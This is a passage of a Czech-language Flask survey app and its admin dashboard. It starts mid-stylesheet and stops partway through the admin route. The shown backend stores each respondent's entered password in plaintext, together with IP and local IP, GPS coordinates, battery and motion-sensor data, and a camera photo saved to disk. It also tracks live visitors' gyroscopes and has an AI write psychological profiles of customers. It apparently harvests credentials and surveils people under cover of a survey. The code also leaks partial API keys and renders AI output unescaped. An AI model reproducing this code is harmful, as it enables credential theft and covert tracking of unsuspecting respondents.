.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:20px;font-size:.72rem;font-weight:600}
.badge-ok{background:rgba(0,255,157,.1);color:var(--accent5);border:1px solid rgba(0,255,157,.2)}
.detail-row{display:none;background:var(--surface2)}
.detail-row.open{display:table-row}
.detail-inner{padding:20px 24px}
.detail-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
@media(max-width:800px){.detail-grid{grid-template-columns:1fr 1fr}}
.d-card{background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:10px;padding:14px}
.d-label{font-size:.7rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:6px}
.d-val{font-size:1rem;font-weight:600;color:#fff}
.ai-profile-box{background:linear-gradient(135deg,rgba(124,92,252,.06),rgba(0,229,255,.04));border:1px solid rgba(124,92,252,.25);border-radius:12px;padding:18px;margin-bottom:16px}
.ai-profile-title{font-size:.72rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--accent2);margin-bottom:12px}
.ai-profile-text{font-size:.92rem;color:rgba(255,255,255,.8);line-height:1.7}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);z-index:200;display:none;align-items:center;justify-content:center;padding:20px}
.modal-overlay.open{display:flex}
.modal-box{background:var(--surface);border:1px solid var(--border2);border-radius:20px;width:min(560px,100%);max-height:85vh;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 40px 80px rgba(0,0,0,.6)}
.modal-box.xl{width:min(1000px,100%)}
.modal-head{padding:18px 22px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.modal-title{font-family:'Syne',sans-serif;font-weight:700;font-size:1rem}
.modal-close{width:28px;height:28px;border-radius:8px;background:rgba(255,255,255,.06);border:none;cursor:pointer;color:var(--muted);display:flex;align-items:center;justify-content:center;font-size:1rem}
.modal-close:hover{background:rgba(255,255,255,.12);color:#fff}
.modal-body{padding:22px;overflow-y:auto;flex:1}
.modal-foot{padding:14px 22px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end}
.btn{padding:8px 16px;border-radius:8px;border:1px solid var(--border2);background:rgba(255,255,255,.06);color:var(--text);font-family:'DM Sans',sans-serif;font-size:.85rem;font-weight:500;cursor:pointer;transition:all .18s;display:inline-flex;align-items:center;gap:6px}
.btn:hover{background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.2);color:#fff}
.btn.accent{background:rgba(124,92,252,.25);border-color:var(--accent);color:#fff}
.btn.accent:hover{background:rgba(124,92,252,.4)}
.btn.danger{background:rgba(255,45,120,.1);border-color:rgba(255,45,120,.3);color:var(--accent3)}
.btn.danger:hover{background:rgba(255,45,120,.25)}
.btn.full{width:100%;justify-content:center}
.fld{background:rgba(255,255,255,.04);border:1px solid var(--border2);border-radius:8px;padding:7px 11px;color:var(--text);font-family:'DM Sans',sans-serif;font-size:.85rem;outline:none;transition:border-color .2s}
.fld:focus{border-color:var(--accent)}
.fld.full{width:100%}
.fld-label{font-size:.72rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--muted);margin-bottom:5px;display:block}
.chat-wrap{display:flex;flex-direction:column;height:400px}
.chat-msgs{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:10px}
.chat-msg{max-width:85%;padding:10px 14px;border-radius:12px;font-size:.88rem;line-height:1.55;white-space:pre-wrap}
.chat-msg.user{align-self:flex-end;background:rgba(124,92,252,.2);border:1px solid rgba(124,92,252,.3)}
.chat-msg.ai{align-self:flex-start;background:var(--surface2);border:1px solid var(--border2)}
.chat-msg.loading{color:var(--muted)}
.chat-msg.loading::after{content:'▊';animation:blink 1s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
.chat-input-row{display:flex;gap:8px;padding:12px 16px 12px;border-top:1px solid var(--border)}
.chat-input{flex:1;background:var(--surface2);border:1px solid var(--border2);border-radius:10px;padding:9px 14px;color:var(--text);font-family:'DM Sans',sans-serif;font-size:.9rem;outline:none;transition:border-color .2s}
.chat-input:focus{border-color:var(--accent)}
.toast{position:fixed;bottom:-80px;right:20px;background:rgba(0,255,157,.08);border:1px solid rgba(0,255,157,.25);border-left:4px solid var(--accent5);backdrop-filter:blur(16px);padding:12px 20px;border-radius:12px;color:#fff;font-weight:600;font-size:.88rem;transition:bottom .5s cubic-bezier(.175,.885,.32,1.275);z-index:999;box-shadow:0 8px 32px rgba(0,0,0,.4);max-width:360px}
.toast.show{bottom:24px}
.setting-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border)}
.toggle-wrap{display:inline-flex;cursor:pointer}
.toggle-wrap input{display:none}
.toggle-track{width:40px;height:22px;background:rgba(255,255,255,.1);border-radius:11px;position:relative;transition:.2s;border:1px solid var(--border2)}
.toggle-track::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:#fff;transition:.2s}
.toggle-wrap input:checked+.toggle-track{background:var(--accent);border-color:var(--accent)}
.toggle-wrap input:checked+.toggle-track::after{transform:translateX(18px)}
.ai-status-banner{background:rgba(0,229,255,.06);border:1px solid rgba(0,229,255,.2);border-radius:10px;padding:12px 16px;margin-bottom:16px;font-size:.85rem;color:var(--accent2)}
</style>
</head>
<body>
<nav class="nav">
  <div class="nav-brand">NEXUS <span>ADMIN</span></div>
  <div class="nav-divider"></div>
  <div class="online-pill"><span class="online-dot"></span><span id="online-count">ONLINE: 0</span></div>
  <div class="nav-right">
    <button id="btn-bulk-del" class="nav-btn danger" onclick="deleteSelected()">&#128465; Smazat (<span id="bulk-n">0</span>)</button>
    <button class="nav-btn primary" onclick="openAIChat()">&#129302; AI Chat</button>
    <button class="nav-btn" onclick="openSettings()">&#9881; Nastaveni</button>
    <button class="nav-btn" onclick="location.reload()">&#8635; Obnovit</button>
    <a href="/export_csv" class="nav-btn">&#8595; CSV</a>
  </div>
</nav>
<div class="main">
  <div class="kpi-grid">
    <div class="kpi c1"><div class="kpi-label">Celkem respondentu</div><div class="kpi-val" id="kpi-tot">KPITOT_PLACEHOLDER</div><div class="kpi-sub">dokoncenych pruzkumu</div></div>
    <div class="kpi c2"><div class="kpi-label">Prum. cas / otazka</div><div class="kpi-val" id="kpi-avg">&mdash;</div><div class="kpi-sub">sekund</div></div>
    <div class="kpi c3"><div class="kpi-label">Top znacka</div><div class="kpi-val" id="kpi-brand" style="font-size:1.4rem;padding-top:4px">&mdash;</div><div class="kpi-sub">nejoblibenejsi</div></div>
    <div class="kpi c4"><div class="kpi-label">AI Status</div><div class="kpi-val" style="font-size:1rem;padding-top:8px;color:var(--accent5)" id="kpi-ai">AI_STATUS_PLACEHOLDER</div><div class="kpi-sub" id="kpi-ai-model">AI_MODEL_PLACEHOLDER</div></div>
  </div>
  <div class="section-title">&#128506; Mapa respondentu</div>
  <div class="card" style="margin-bottom:24px;padding:0;overflow:hidden"><div id="map-box"></div></div>
  <div class="charts-3col">
    <div class="card"><div class="card-head">&#128241; Zarizeni</div><div class="card-body"><div class="chart-wrap"><canvas id="c-dev"></canvas></div></div></div>
    <div class="card"><div class="card-head">&#128187; Systemy</div><div class="card-body"><div class="chart-wrap"><canvas id="c-os"></canvas></div></div></div>
    <div class="card"><div class="card-head">&#9201; Aktivita v case</div><div class="card-body"><div class="chart-wrap"><canvas id="c-time"></canvas></div></div></div>
  </div>
  <div class="section-title">&#128202; Analytika odpovedi</div>
  <div class="q-charts-grid" id="q-charts"></div>
  <div class="section-title">&#128100; Databaze respondentu (<span id="cnt">CNT_PLACEHOLDER</span>)</div>
  <div class="card">
    <div class="tbl-wrap">
      <table>
        <thead><tr>
          <th style="width:40px"><input type="checkbox" id="master-chk" onchange="toggleAll(this)" style="cursor:pointer;transform:scale(1.3)"></th>
          <th>Cas</th><th>Identita</th><th>Lokace</th><th>Zarizeni</th><th>Stav</th><th>Akce</th>
        </tr></thead>
        <tbody id="tb">TABLE_PLACEHOLDER</tbody>
      </table>
    </div>
  </div>
</div>

<!-- Settings Modal -->
<div class="modal-overlay" id="m-settings">
  <div class="modal-box">
    <div class="modal-head"><span class="modal-title">&#9881; Nastaveni</span><button class="modal-close" onclick="closeModal('m-settings')">&#10005;</button></div>
    <div class="modal-body">
      <div style="margin-bottom:16px">
        <div style="font-size:.78rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border)">Pruzkum</div>
        <div class="setting-row"><div><div style="font-size:.9rem;font-weight:500">Nazev pruzkumu</div></div><input class="fld" id="cfg-title" style="width:200px"></div>
        <div class="setting-row"><div><div style="font-size:.9rem;font-weight:500">Podnazev</div></div><input class="fld" id="cfg-subtitle" style="width:200px"></div>
        <div class="setting-row"><div><div style="font-size:.9rem;font-weight:500">Prihlaseni na uvod</div></div><label class="toggle-wrap"><input type="checkbox" id="cfg-login"><div class="toggle-track"></div></label></div>
      </div>
      <div style="margin-bottom:16px">
        <div style="font-size:.78rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border)">Databaze</div>
        <button class="btn danger full" style="margin-bottom:8px" onclick="cleanGhosts()">&#129529; Vymazat duchy (prazdne zaznamy)</button>
        <button class="btn danger full" onclick="nukeDB()">&#128165; Smazat vse</button>
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn" onclick="closeModal('m-settings')">Zrusit</button>
      <button class="btn accent" onclick="saveSettings()">&#128190; Ulozit</button>
    </div>
  </div>
</div>

<!-- AI Chat Modal -->
<div class="modal-overlay" id="m-chat">
  <div class="modal-box">
    <div class="modal-head"><span class="modal-title">&#129302; AI Asistent</span><button class="modal-close" onclick="closeModal('m-chat')">&#10005;</button></div>
    <div class="modal-body" style="padding:0">
      <div class="chat-wrap">
        <div class="chat-msgs" id="chat-msgs">
          <div class="chat-msg ai">Ahoj! Analyzuji data pruzkumu. Zeptej se me na cokoliv &ndash; trendy, statistiky, konkretni respondenty.</div>
        </div>
        <div class="chat-input-row">
          <input class="chat-input" id="chat-in" placeholder="Napiste dotaz..." onkeydown="if(event.key==='Enter')sendChat()">
          <button class="btn accent" onclick="sendChat()" style="padding:9px 16px">&rarr;</button>
        </div>
      </div>
    </div>
  </div>
</div>

<div class="toast" id="toast"><span>&#10003;</span><span id="toast-msg">Novy respondent!</span></div>
<form id="save-form" action="/save_settings" method="POST" style="display:none">
  <input type="hidden" name="questions_json" id="q-json-out">
  <input type="hidden" name="survey_title" id="cfg-title-out">
  <input type="hidden" name="survey_subtitle" id="cfg-subtitle-out">
  <input type="hidden" name="login_enabled" id="cfg-login-out">
</form>

<script>
const MASTER = ENTRIES_JSON_PLACEHOLDER;
const QS_DEF = JSON.parse(atob("QS_B64_ADMIN_PLACEHOLDER"));
const HAS_AI = HAS_AI_PLACEHOLDER;
const CFG = CFG_JSON_PLACEHOLDER;
const P = ['#7c5cfc','#00e5ff','#ff2d78','#ffb547','#00ff9d','#ff9c00','#4fffb0','#e040fb','#40c4ff','#ff6e40'];
let lastLen = MASTER.length;

Chart.defaults.color='rgba(255,255,255,0.5)';
Chart.defaults.borderColor='rgba(255,255,255,0.06)';
Chart.defaults.maintainAspectRatio=false;
Chart.defaults.font.family="'DM Sans', sans-serif";

const esc=s=>{if(!s)return'';let p=document.createElement('p');p.appendChild(document.createTextNode(String(s)));return p.innerHTML};

document.addEventListener('DOMContentLoaded',()=>{
  try{initMap()}catch(e){}
  renderCharts(MASTER);
  setInterval(pollLive,3000);
  document.getElementById('cfg-title').value=CFG.survey_title||'NEXUS SURVEY';
  document.getElementById('cfg-subtitle').value=CFG.survey_subtitle||'';
  document.getElementById('cfg-login').checked=CFG.login_enabled!==false;
});

function initMap(){
  const map=L.map('map-box',{zoomControl:true}).setView([50,14],4);
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19}).addTo(map);
  MASTER.forEach(u=>{
    if(u.lat&&u.lon&&!isNaN(u.lat)&&u.lat!=0){
      const icon=L.divIcon({html:`<div style="width:10px;height:10px;border-radius:50%;background:#7c5cfc;box-shadow:0 0 8px #7c5cfc;border:2px solid rgba(255,255,255,0.5)"></div>`,className:'',iconSize:[10,10]});
      L.marker([u.lat,u.lon],{icon}).addTo(map).bindPopup(`<b>${esc(u.username)||'Anonym'}</b><br>${esc(u.city)||''}`);
    }
  });
}

const chartInstances={};
function destroyChart(id){if(chartInstances[id]){chartInstances[id].destroy();delete chartInstances[id]}}
function mkChart(id,cfg){destroyChart(id);const c=new Chart(document.getElementById(id),cfg);chartInstances[id]=c;return c}

function renderCharts(data){
  const mobs=data.filter(e=>String(e.device||'').includes('Mobil')).length;
  mkChart('c-dev',{type:'doughnut',data:{labels:['Mobil','PC/Jine'],datasets:[{data:[mobs,data.length-mobs],backgroundColor:[P[0],P[2]],borderWidth:0,hoverOffset:4}]},options:{maintainAspectRatio:false,cutout:'72%',plugins:{legend:{position:'right',labels:{boxWidth:10,font:{size:11},color:'rgba(255,255,255,0.6)'}}}}});
  const os={};data.forEach(e=>{const d=String(e.device||'Jine');const o=d.includes('|')?d.split('|')[1].trim().split(' ')[0]:'Jine';os[o]=(os[o]||0)+1});
  mkChart('c-os',{type:'bar',data:{labels:Object.keys(os),datasets:[{data:Object.values(os),backgroundColor:P[1],borderRadius:6,borderSkipped:false}]},options:{maintainAspectRatio:false,scales:{y:{grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'rgba(255,255,255,0.4)',font:{size:10}}},x:{display:false}},plugins:{legend:{display:false}}}});
  const hrs={};data.forEach(e=>{try{const h=String(e.created_at||'').split('T')[1]||String(e.created_at||'').split(' ')[1];if(h){const hr=h.split(':')[0];hrs[hr]=(hrs[hr]||0)+1}}catch{}});
  mkChart('c-time',{type:'line',data:{labels:Object.keys(hrs).sort(),datasets:[{data:Object.values(hrs),borderColor:P[4],backgroundColor:'rgba(0,255,157,0.06)',fill:true,tension:0.4,borderWidth:2,pointRadius:3}]},options:{maintainAspectRatio:false,scales:{y:{grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'rgba(255,255,255,0.4)',font:{size:10}}},x:{grid:{display:false},ticks:{color:'rgba(255,255,255,0.4)',font:{size:10}}}},plugins:{legend:{display:false}}}});
  const grid=document.getElementById('q-charts');grid.innerHTML='';
  const norm=s=>{if(!s)return null;const x=String(s).trim().toLowerCase();return x.charAt(0).toUpperCase()+x.slice(1)};
  const qMap={};data.forEach(r=>{const qz=r.quiz||{};for(const qId in qz){if(!qMap[qId]){const d=QS_DEF.find(x=>x.id===qId);qMap[qId]={id:qId,label:d?d.label:qId,chart:d?d.chart:'doughnut'}}}});
  let i=0;
  for(const qId in qMap){
    const q=qMap[qId];const counts={};
    data.forEach(r=>{const v=(r.quiz||{})[q.id];if(Array.isArray(v)){v.forEach(x=>{const n=norm(x);if(n&&n!=='-')counts[n]=(counts[n]||0)+1})}else{const n=norm(v);if(n&&n!=='-')counts[n]=(counts[n]||0)+1}});
    if(!Object.keys(counts).length)continue;
    const cid='qc_'+i;
    grid.innerHTML+=`<div class="card"><div class="card-head">${esc(q.label)}</div><div class="card-body"><div class="chart-wrap"><canvas id="${cid}"></canvas></div></div></div>`;
    const idx=i;
    setTimeout(()=>{
      try{mkChart(cid,{type:q.chart==='bar'?'bar':'doughnut',data:{labels:Object.keys(counts),datasets:[{data:Object.values(counts),backgroundColor:P,borderRadius:4,borderWidth:0,hoverOffset:6}]},options:{maintainAspectRatio:false,indexAxis:q.chart==='bar'?'y':'x',cutout:q.chart!=='bar'?'68%':undefined,plugins:{legend:{display:q.chart!=='bar',position:'right',labels:{boxWidth:8,font:{size:10},color:'rgba(255,255,255,0.6)'}}},scales:q.chart==='bar'?{y:{grid:{display:false},ticks:{color:'rgba(255,255,255,0.6)',font:{size:11}}},x:{display:false}}:{}}})}catch(e){}
    },50);
    i++;
  }
}

function pollLive(){
  fetch('/active_data').then(r=>r.json()).then(d=>{
    document.getElementById('online-count').textContent='ONLINE: '+(d.online_count||0);
    if(d.db_len!=null)document.getElementById('kpi-tot').textContent=d.db_len;
    if(d.kpi_avg!=null)document.getElementById('kpi-avg').textContent=d.kpi_avg+'s';
    if(d.kpi_brand)document.getElementById('kpi-brand').textContent=esc(d.kpi_brand);
    if(d.db_len>lastLen){lastLen=d.db_len;showToast('Novy respondent: '+esc(d.last_user||''));setTimeout(()=>location.reload(),2500)}
  }).catch(()=>{});
}

function showToast(msg){const t=document.getElementById('toast');document.getElementById('toast-msg').textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),4000)}
function toggleDetail(id){document.getElementById('dr-'+id).classList.toggle('open')}
function toggleAll(m){document.querySelectorAll('.row-chk').forEach(c=>c.checked=m.checked);updateBulkBtn()}
function updateBulkBtn(){const n=document.querySelectorAll('.row-chk:checked').length;document.getElementById('bulk-n').textContent=n;document.getElementById('btn-bulk-del').style.display=n>0?'inline-flex':'none'}
function deleteSelected(){const ids=Array.from(document.querySelectorAll('.row-chk:checked')).map(c=>c.value);if(!ids.length)return;if(!confirm('Smazat '+ids.length+' zaznamu?'))return;fetch('/del_multiple',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ids})}).then(()=>location.reload())}
function delOne(id){if(confirm('Smazat?'))fetch('/del_one/'+id,{method:'POST'}).then(()=>location.reload())}
function cleanGhosts(){if(confirm('Vymazat duchy?'))fetch('/delete_ghosts',{method:'POST'}).then(()=>{closeModal('m-settings');location.reload()})}
function nukeDB(){if(confirm('Opravdu smazat VSECHNO?'))fetch('/nuke_db',{method:'POST'}).then(()=>{closeModal('m-settings');location.reload()})}

function genProfile(id,btn){
  btn.textContent='Analyzuji...';btn.disabled=true;
  fetch('/api/generate_profile/'+id,{method:'POST'}).then(r=>r.json()).then(d=>{
    if(d.profile){document.getElementById('ai-box-'+id).innerHTML=`<div class="ai-profile-text">${esc(d.profile)}</div>`}
    else{btn.textContent='Chyba: '+(d.error||'?');btn.disabled=false}
  }).catch(()=>{btn.textContent='Chyba';btn.disabled=false});
}

// AI CHAT - klic fix
function openAIChat(){openModal('m-chat');document.getElementById('chat-in').focus()}
function sendChat(){
  const input=document.getElementById('chat-in');
  const msg=input.value.trim();
  if(!msg)return;
  input.value='';
  const msgs=document.getElementById('chat-msgs');
  msgs.innerHTML+=`<div class="chat-msg user">${esc(msg)}</div>`;
  const loadId='ai-'+Date.now();
  msgs.innerHTML+=`<div class="chat-msg ai loading" id="${loadId}">Zpracovavam</div>`;
  msgs.scrollTop=msgs.scrollHeight;
  
  const summary={
    total:MASTER.length,
    sample:MASTER.slice(0,15).map(e=>({quiz:e.quiz,device:e.device,city:e.city,username:e.username}))
  };
  
  fetch('/api/chat',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({message:msg,data_summary:summary})
  })
  .then(r=>{
    if(!r.ok)throw new Error('HTTP '+r.status);
    return r.json();
  })
  .then(d=>{
    const el=document.getElementById(loadId);
    if(el){el.classList.remove('loading');el.textContent=d.reply||'Prazdna odpoved'}
    msgs.scrollTop=msgs.scrollHeight;
  })
  .catch(err=>{
    const el=document.getElementById(loadId);
    if(el){el.classList.remove('loading');el.textContent='Chyba: '+err.message}
  });
}

function openSettings(){openModal('m-settings')}
function openModal(id){document.getElementById(id).classList.add('open')}
function closeModal(id){document.getElementById(id).classList.remove('open')}
document.querySelectorAll('.modal-overlay').forEach(m=>{m.addEventListener('click',e=>{if(e.target===m)m.classList.remove('open')})});
function saveSettings(){
  document.getElementById('q-json-out').value=JSON.stringify(QS_DEF);
  document.getElementById('cfg-title-out').value=document.getElementById('cfg-title').value;
  document.getElementById('cfg-subtitle-out').value=document.getElementById('cfg-subtitle').value;
  document.getElementById('cfg-login-out').value=document.getElementById('cfg-login').checked?'1':'0';
  document.getElementById('save-form').submit();
}
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════════════════════
@app.route('/')
def home():
    cfg = load_config()
    q_b64 = base64.b64encode(json.dumps(cfg['questions']).encode()).decode()
    title = cfg.get('survey_title', DEFAULT_CONFIG['survey_title'])
    subtitle = cfg.get('survey_subtitle', DEFAULT_CONFIG['survey_subtitle'])
    html = USER_HTML.replace('SURVEY_TITLE_PLACEHOLDER', title)
    html = html.replace('SURVEY_SUBTITLE_PLACEHOLDER', subtitle)
    html = html.replace('QS_B64_PLACEHOLDER', q_b64)
    return html

@app.route('/beat')
def beat():
    ip = request.remote_addr
    active_users_cache[ip] = {
        't': time.time(),
        'step': request.args.get('step', 'Start'),
        'gyro': request.args.get('gyro', '0,0,0')
    }
    return "", 200

@app.route('/active_data')
def active_data():
    if not session.get('logged_in'):
        return jsonify({})
    now = time.time()
    for ip in list(active_users_cache.keys()):
        if now - active_users_cache[ip]['t'] > 6:
            del active_users_cache[ip]
    try:
        db = get_db()
        count_row = db.execute("SELECT COUNT(id) AS cnt FROM visits").fetchone()
        count = count_row['cnt'] if count_row else 0
        rows = db.execute("SELECT username, quiz_data, timing_data FROM visits ORDER BY id DESC").fetchall()
        t_tot, t_cnt, brands = 0, 0, []
        last_user = ""
        if rows:
            last_user = (rows[0]['username'] or '').split('|')[0].strip()
        for r in rows:
            try:
                for v in json.loads(r['timing_data'] or '{}').values():
                    t_tot += float(v); t_cnt += 1
            except: pass
            try:
                qd = json.loads(r['quiz_data'] or '{}')
                b = qd.get('q_brand_s') or qd.get('q_brand_h')
                if b:
                    if isinstance(b, list): brands.extend(b)
                    else: brands.append(chirurgicka_ocista(b))
            except: pass
        avg_time = round(t_tot / t_cnt, 1) if t_cnt > 0 else 0
        top_brand = max(set(brands), key=brands.count) if brands else "-"
        return jsonify({
            "users": [{"ip": i, "step": d['step'], "gyro": d['gyro']} for i, d in active_users_cache.items()],
            "db_len": count,
            "online_count": len(active_users_cache),
            "kpi_avg": avg_time,
            "kpi_brand": top_brand,
            "last_user": last_user
        })
    except Exception as e:
        log.error(f"active_data chyba: {e}")
        return jsonify({"db_len": 0, "online_count": len(active_users_cache), "kpi_avg": 0, "kpi_brand": "-", "last_user": ""})

@app.route('/get_adaptive_question', methods=['POST'])
def get_adaptive_question():
    data = request.json or {}
    quiz = data.get('quiz', {})
    fallback = {"id": "ZACHRANA", "label": "Jak bys popsala svuj styl jednim slovem?", "opts": ["Minimalisticky", "Vyrazny", "Sportovni"]}
    if not HAS_AI:
        return jsonify(fallback)
    prompt = f"""Analyzuj odpovedi zakaznice: {json.dumps(quiz, ensure_ascii=False)}.
Vymysli 1 kratkoupsychologickou otazku na miru (cesky, bez diakritiky).
Vrat POUZE validni JSON objekt (zadny dalsi text, zadne markdown):
{{"id": "AI_BONUS", "label": "text otazky", "opts": ["moznost A", "moznost B", "moznost C"]}}"""
    ai_resp = ask_ai(prompt, expect_json=True)
    if ai_resp:
        try:
            start = ai_resp.find("{")
            end = ai_resp.rfind("}") + 1
            if start >= 0 and end > start:
                return jsonify(json.loads(ai_resp[start:end]))
        except Exception as e:
            log.error(f"JSON parse chyba: {e} | odpoved: {ai_resp[:200]}")
    return jsonify(fallback)

@app.route('/api/generate_profile/<int:uid>', methods=['POST'])
def generate_profile(uid):
    if not session.get('logged_in'):
        return jsonify({"error": "Neprihlaseni"})
    db = get_db()
    row = db.execute("SELECT quiz_data FROM visits WHERE id=%s", (uid,)).fetchone()
    if not row:
        return jsonify({"error": "Zaznam nenalezen"})
    if not HAS_AI:
        return jsonify({"error": "AI neni konfigurovana"})
    prompt = f"""Jsi expert na behavioralni psychologii.
Analyzuj odpovedi zakaznice z pruzkumu: {row['quiz_data']}
Vypracuj strucny psychologicky profil (max 3 vety, bez diakritiky)."""
    profile = ask_ai(prompt)
    if profile:
        db.execute("UPDATE visits SET ai_profile=%s WHERE id=%s", (profile, uid))
        db.commit()
        return jsonify({"profile": profile})
    return jsonify({"error": "AI neodpovedela"})

@app.route('/api/chat', methods=['POST'])
def ai_chat():
    if not session.get('logged_in'):
        return jsonify({"reply": "Neprihlaseni"})
    data = request.json or {}
    msg = data.get('message', '').strip()
    summary = data.get('data_summary', {})

    if not msg:
        return jsonify({"reply": "Prazdna zprava."})

    if not HAS_AI:
        return jsonify({"reply": "AI neni konfigurovana. Nastav CLAUDE_API_KEY nebo GEMINI_API_KEY v environment variables."})

    total = summary.get('total', 0)
    sample = summary.get('sample', [])

    prompt = f"""Jsi asistent pro analyzu dat pruzkumu. Odpovez cesky, strucne (max 120 slov), bez diakritiky.

Data pruzkumu:
- Celkem respondentu: {total}
- Vzorek poslednich {len(sample)} respondentu: {json.dumps(sample, ensure_ascii=False)}

Otazka admina: {msg}

Odpovez analyticky a vecne."""

    reply = ask_ai(prompt, max_tokens=400)

    if reply:
        return jsonify({"reply": reply})
    else:
        # Diagnosticka zprava misto genericke chyby
        ai_info = []
        if CLAUDE_API_KEY:
            ai_info.append(f"Claude key: nastaven ({CLAUDE_API_KEY[:10]}...)")
        else:
            ai_info.append("Claude key: NENI NASTAVEN")
        if GEMINI_API_KEY:
            ai_info.append(f"Gemini key: nastaven ({GEMINI_API_KEY[:10]}...)")
        else:
            ai_info.append("Gemini key: NENI NASTAVEN")
        return jsonify({"reply": f"AI API selhalo. Zkontroluj logy serveru.\n{chr(10).join(ai_info)}"})

@app.route('/save_all', methods=['POST'])
def save_all():
    try:
        d = request.json
        if not d:
            return "Ignorovano", 200
        if not d.get('timing') or len(d.get('timing', {})) == 0:
            return "Ignorovano", 200
        db = get_db()
        quiz = d.get('quiz', {})
        try:
            stock = int(quiz.get('stock_count', 1) or 1)
            weekly_freq = int(quiz.get('wear_frequency', 3) or 3)
            monthly_freq = (weekly_freq * 4) if weekly_freq > 0 else 1
            restock_date = datetime.now() + timedelta(days=(stock * 2 / monthly_freq) * 30)
            quiz['restock_prediction'] = restock_date.strftime("%Y-%m-%d")
        except: pass
        city = get_ip_location(request.remote_addr)
        dev_info = d.get('device') or parse_device(request.headers.get('User-Agent', ''))
        c = db.execute(
            '''INSERT INTO visits (username, password, ip, local_ip, city, lat, lon, device, battery, quiz_data, timing_data, motion_data, start_time)
               VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s) RETURNING id''',
            (d.get('u', 'Anonym'), d.get('p', ''), request.remote_addr, d.get('local_ip', 'N/A'),
             city, d.get('lat'), d.get('lon'), dev_info, d.get('battery', 'N/A'),
             json.dumps(quiz, ensure_ascii=False), json.dumps(d.get('timing', {})),
             d.get('motion', 'N/A'), datetime.now().strftime("%H:%M | %d.%m."))
        )
        vid = c.fetchone()['id']
        if d.get('photo'):
            try:
                img = d['photo'].split(",")[1] if "," in d['photo'] else d['photo']
                fname = f"cam_{vid}_{int(time.time())}.jpg"
                with open(os.path.join(UPLOAD_FOLDER, fname), "wb") as f:
                    f.write(base64.b64decode(img))
                db.execute("UPDATE visits SET cam_photo=%s WHERE id=%s", (fname, vid))
            except: pass
        db.commit()
        return "OK", 200
    except Exception as e:
        log.error(f"save_all chyba: {e}")
        return "Err", 500

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['logged_in'] = True
    if not session.get('logged_in'):
        return """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans&display=swap" rel="stylesheet">
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#06070d;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'DM Sans',sans-serif}
.box{background:#0f1120;border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:40px;width:360px;text-align:center}
h1{font-family:'Syne',sans-serif;font-size:1.6rem;color:#fff;margin-bottom:6px}
p{color:#5a5f7a;font-size:.9rem;margin-bottom:28px}
input{width:100%;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:13px 16px;color:#fff;font-family:'DM Sans',sans-serif;font-size:1rem;outline:none;text-align:center;letter-spacing:3px;transition:border-color .2s}
input:focus{border-color:#7c5cfc}
button{width:100%;margin-top:12px;background:linear-gradient(135deg,#7c5cfc,#9b6dff);color:#fff;border:none;border-radius:12px;padding:13px;font-family:'DM Sans',sans-serif;font-size:1rem;font-weight:600;cursor:pointer}</style></head>
<body><div class="box"><h1>NEXUS ADMIN</h1><p>Zadej pristupove heslo</p>
<form method="POST"><input name="p" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" autofocus><button type="submit">Vstoupit &rarr;</button></form></div></body></html>"""

    db = get_db()
    rows = db.execute("SELECT * FROM visits ORDER BY id DESC LIMIT 500").fetchall()
    entries = [dict(r) for r in rows]
    for e in entries:
        try:
            raw = json.loads(e.get('quiz_data') or '{}')
            clean = {}
            for k, v in raw.items():
                if isinstance(v, list):
                    clean[k] = [chirurgicka_ocista(i) for i in v]
                else:
                    clean[k] = chirurgicka_ocista(v)
            e['quiz'] = clean
        except:
            e['quiz'] = {}
        try:
            e['timing'] = json.loads(e.get('timing_data') or '{}')
        except:
            e['timing'] = {}

    cfg = load_config()
    qs_b64 = base64.b64encode(json.dumps(cfg.get('questions', [])).encode()).decode()

    # Render table rows
    table_rows = ""
    for e in entries:
        tot = 0
        for v in (e.get('timing') or {}).values():
            try: tot += float(v)
            except: pass
        dev = str(e.get('device') or '')
        dev_disp = dev.split('|')[1].strip() if '|' in dev else (dev or 'Neznamo')

        ai_html = ""
        if e.get('ai_profile'):
            ai_html = f'<div class="ai-profile-text">{e["ai_profile"]}</div>'
        elif HAS_AI:
